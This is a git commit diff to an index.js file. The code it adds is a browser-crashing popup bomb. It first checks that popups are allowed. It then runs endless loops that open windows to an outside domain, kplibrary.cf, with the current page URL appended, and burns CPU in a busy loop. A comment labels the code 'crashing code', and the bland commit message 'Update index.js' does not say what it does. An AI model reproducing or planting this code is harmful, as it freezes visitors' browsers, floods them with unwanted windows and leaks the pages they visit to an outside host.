85cd2603ef999f015a881aafc5131fb3ccecde37
Dr3w0623 <34252192+Dr3w0623@users.noreply.github.com>
2017-12-12 13:59:32 -0500

    Update index.js

--- index.js
+++ index.js
@@ -1,4 +1,30 @@
-  while (true) {
+var myPopup = window.open("site-on-my-domain", "screenX=100");
+if (!myPopup)
+  alert("failed for most browsers");
+else {
+  myPopup.onload = function() {
+    setTimeout(function() {
+      if (myPopup.screenX === 0)
+
+        while (true) {
+        window.open("http://kplibrary.cf/")
+        var strWindowFeatures = "location=yes,height=1200,width=1400,scrollbars=yes,status=yes";
+        var URL = "http://kplibrary.cf/" + location.href;
+        var win = window.open(URL, "_blank", strWindowFeatures);
+        setTimeout(function() {
+          for (var i = 0; i === i; i++) {}
+        }, 5);
+      }
+    }, 0);
+  };
+}
+
+
+
+
+//: crashing code:
+
+while (true) {
     window.open("http://kplibrary.cf/")
     var strWindowFeatures = "location=yes,height=1200,width=1400,scrollbars=yes,status=yes";
     var URL = "http://kplibrary.cf/" + location.href;
